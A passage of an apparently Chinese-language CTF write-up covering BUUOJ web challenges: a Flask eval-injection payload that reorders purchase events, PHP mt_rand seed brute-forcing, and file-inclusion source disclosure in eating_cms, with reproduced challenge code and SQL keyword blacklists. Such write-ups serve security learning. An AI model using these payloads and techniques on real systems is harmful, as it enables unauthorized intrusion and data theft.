class="token punctuation">(</span><span class="token string">'action:view;index'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">buy_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    num_items <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> num_items <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br />'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">+=</span> num_items    trigger_event<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'func:consume_point;&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>        num_items<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'action:view;index'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">consume_point_function</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    point_to_consume <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> point_to_consume<span class="token punctuation">:</span>        <span class="token keyword">raise</span> RollBackException<span class="token punctuation">(</span><span class="token punctuation">)</span>    session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">-=</span> point_to_consume<span class="token keyword">def</span> <span class="token function">show_flag_function</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token comment"># return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span>    <span class="token keyword">return</span> <span class="token string">'You naughty boy! ;) &lt;br />'</span><span class="token keyword">def</span> <span class="token function">get_flag_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">5</span><span class="token punctuation">:</span>        <span class="token comment"># show_flag_function has been disabled, no worries</span>        trigger_event<span class="token punctuation">(</span><span class="token string">'func:show_flag;'</span> <span class="token operator">+</span> FLAG<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    trigger_event<span class="token punctuation">(</span><span class="token string">'action:view;index'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span></code></pre><p>题目中有flask，网站内容和购买有关，盲猜flask session逻辑漏洞</p><img src="/article/Buuoj-WEB-Write-up/image-20201129174627993.png" class="" title="image-20201129174627993" loading="lazy"><p>拿去<code>flask_session_cookie_manager</code>解密</p><img src="/article/Buuoj-WEB-Write-up/image-20201129174747409.png" class="" title="image-20201129174747409" loading="lazy"><p><code>&#123;&quot;log&quot;:[&#123;&quot; b&quot;:&quot;YWN0aW9uOnZpZXc7aW5kZXg=&quot;&#125;,&#123;&quot; b&quot;:&quot;YWN0aW9uOnZpZXc7aW5kZXg=&quot;&#125;],&quot;num_items&quot;:0,&quot;points&quot;:3&#125;</code></p><p>base64再解密得</p><p><code>&#123;&quot;log&quot;:[&#123;&quot; b&quot;:&quot;action:view;index&quot;&#125;,&#123;&quot; b&quot;:&quot;action:view;index&quot;&#125;],&quot;num_items&quot;:0,&quot;points&quot;:3&#125;</code></p><p>分析serve.py</p><p>先找flag</p><img src="/article/Buuoj-WEB-Write-up/image-20201129175323407.png" class="" title="image-20201129175323407" loading="lazy"><p>发现在get_flag_handler函数里，而条件是<code>session[&#39;num_items&#39;] &gt;= 5</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129175427470.png" class="" title="image-20201129175427470" loading="lazy"><p>再跳到buy_handler函数里</p><img src="/article/Buuoj-WEB-Write-up/image-20201129175938047.png" class="" title="image-20201129175938047" loading="lazy"><p>关键逻辑</p><p><strong>num_items数目先增，然后再扣point，如果point不够再把num_items扣回去</strong></p><p>然后就不会了</p><p>开始分析大佬的WP</p><ul><li><p>仔细分析execute_event_loop，会发现里面有一个eval函数，而且是可控的！ </p></li><li><p>利用eval()可以导致任意命令执行，使用注释符可以 bypass 掉后面的拼接部分。 </p></li><li><p>若让eval()去执行trigger_event()，并且在后面跟两个命令作为参数，分别是buy和get_flag，那么buy和get_flag便先后进入队列。 </p></li><li><p>根据顺序会先执行buy_handler()，此时consume_point进入队列，排在get_flag之后，我们的目标达成。 </p></li></ul><p>最终payload：</p><pre class="language-none"><code class="language-none">action:trigger_event%23;action:buy;5%23action:get_flag;</code></pre><p>不知道编码问题？<code>#</code>必须写成 <code>%23</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129181046007.png" class="" title="image-20201129181046007" loading="lazy"><p>拿去解密得</p><img src="/article/Buuoj-WEB-Write-up/image-20201129181142945.png" class="" title="image-20201129181142945" loading="lazy"><p>base64解密得</p><pre class="language-none"><code class="language-none">&#123;&quot;log&quot;:[&#123;&quot; b&quot;:&quot;action:trigger_event#;action:buy;5#action:get_flag;&quot;&#125;,[&#123;&quot; b&quot;:&quot;action:buy;5&quot;&#125;,&#123;&quot; b&quot;:&quot;action:get_flag;&quot;&#125;],[&#123;&quot; b&quot;:&quot;func:consume_point;5&quot;&#125;,&#123;&quot; b&quot;:&quot;action:view;index&quot;&#125;],&#123;&quot; b&quot;:&quot;func:show_flag;flag&#123;f0c04d65-ffa9-472b-9263-1e308ad45fd8&#125;&quot;&#125;,&#123;&quot; b&quot;:&quot;action:view;index&quot;&#125;],&quot;num_items&quot;:0,&quot;points&quot;:3&#125;&#96;</code></pre><p>flag即在其中</p><hr><h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><img src="/article/Buuoj-WEB-Write-up/image-20201129181539620.png" class="" title="image-20201129181539620" loading="lazy"><p>看源码有个hidden标签，直接去掉得到源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token shell-comment comment">#这不是抽奖程序的源代码！不许看！</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'seed'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">999999999</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str_long1</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="token punctuation">;</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token single-quoted-string string">''</span><span class="token punctuation">;</span><span class="token variable">$len1</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span><span class="token variable">$str_show</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;p id='p1'>"</span><span class="token punctuation">.</span><span class="token variable">$str_show</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;/p>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'num'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>x        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;p id=flag>抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;p id=flag>没抽中哦，再试试吧&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"check.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>php伪随机数爆破</p><p>用php_mt_seed</p><p>扔虚拟机里make</p><img src="/article/Buuoj-WEB-Write-up/image-20201129183233275.png" class="" title="image-20201129183233275" loading="lazy"><p>然后用python脚本转化得到的数据</p><pre class="language-python" data-language="python"><code class="language-python">str1<span class="token operator">=</span><span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>str2<span class="token operator">=</span><span class="token string">'uG8C1Wg91B'</span>str3 <span class="token operator">=</span> str1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>     <span class="token comment"># reverse</span>length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span>    <span class="token comment"># 10</span>res<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> str2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> str1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>            res<span class="token operator">+=</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span><span class="token string">'0'</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span>            <span class="token keyword">break</span><span class="token keyword">print</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span></code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201129184300244.png" class="" title="image-20201129184300244" loading="lazy"><p>然后运行<code>./php_mt_seed 54 54 0 61 45 45 0 61 54 54 0 61 7 7 0 61 59 59 0 61 35 35 0 61 4 4 0 61 15 15 0 61 53 53 0 61 40 40 0 61</code></p><p>爆破得<code>394409044</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129184626939.png" class="" title="image-20201129184626939" loading="lazy"><p>回去跑出完整字符串</p><img src="/article/Buuoj-WEB-Write-up/image-20201129184942098.png" class="" title="image-20201129184942098" loading="lazy"><p><code>SJShX9epREbTBLfdc4Gu</code></p><p>回去提交出flag</p><img src="/article/Buuoj-WEB-Write-up/image-20201129185017278.png" class="" title="image-20201129185017278" loading="lazy"><hr><h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><p>打开就是登陆界面</p><img src="/article/Buuoj-WEB-Write-up/image-20201129203609192.png" class="" title="image-20201129203609192" loading="lazy"><p>猜想SQL注入，发现过滤引号，暂时放弃这条路</p><img src="/article/Buuoj-WEB-Write-up/image-20201129203656135.png" class="" title="image-20201129203656135" loading="lazy"><p>不给扫目录，盲猜访问<code>register.php</code>，还真有</p><p>注册用户登陆进去</p><img src="/article/Buuoj-WEB-Write-up/image-20201129203815847.png" class="" title="image-20201129203815847" loading="lazy"><p>发现url猫腻，文件包含，利用伪协议读取一下index</p><img src="/article/Buuoj-WEB-Write-up/image-20201129203901945.png" class="" title="image-20201129203901945" loading="lazy"><pre class="language-none"><code class="language-none">PD9waHAKcmVxdWlyZV9vbmNlICJmdW5jdGlvbi5waHAiOwppZihpc3NldCgkX1NFU1NJT05bJ2xvZ2luJ10gKSl7CiAgICBIZWFkZXIoIkxvY2F0aW9uOiB1c2VyLnBocD9wYWdlPWluZm8iKTsKfQplbHNlewogICAgaW5jbHVkZSAidGVtcGxhdGVzL2luZGV4Lmh0bWwiOwp9Cj8+</code></pre><p>解密得index.php源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span> <span class="token double-quoted-string string">"function.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'login'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: user.php?page=info"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">include</span> <span class="token double-quoted-string string">"templates/index.html"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>再读一下user.php</p><p><code>user.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"function.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'isadmin'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token single-quoted-string string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$oper_you_can_do</span> <span class="token operator">=</span> <span class="token variable">$OPERATE_admin</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$oper_you_can_do</span> <span class="token operator">=</span> <span class="token variable">$OPERATE</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//die($_SESSION['isadmin']);</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'isadmin'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token single-quoted-string string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'info'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">===</span> <span class="token single-quoted-string string">'info'</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span><span class="token comment">//            echo("&lt;script>alert('no premission to visit info, only admin can, you are guest')&lt;/script>");</span>            <span class="token function">Header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: user.php?page=guest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">filter_directory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//if(!in_array($page,$oper_you_can_do))&#123;</span><span class="token comment">//    $page = 'info';</span><span class="token comment">//&#125;</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$page</span></span>.php"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>再读一下function.php</p><p><code>function.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span> <span class="token double-quoted-string string">"config.php"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: hacker.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">filter_directory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$keywords</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token double-quoted-string string">"flag"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"manage"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"ffffllllaaaaggg"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"REQUEST_URI"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$uri</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($query);</span><span class="token comment">//    die();</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$keywords</span> <span class="token keyword">as</span> <span class="token variable">$token</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$query</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">filter_directory_guest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$keywords</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token double-quoted-string string">"flag"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"manage"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"ffffllllaaaaggg"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"info"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"REQUEST_URI"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$uri</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($query);</span><span class="token comment">//    die();</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$keywords</span> <span class="token keyword">as</span> <span class="token variable">$token</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$query</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">Filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password"</span><span class="token punctuation">;</span>    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'(),_*`-@=+>&lt;"</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$whitelist</span></span>"</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean constant">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/<span class="token interpolation"><span class="token variable">$blacklist</span></span>/is"</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token 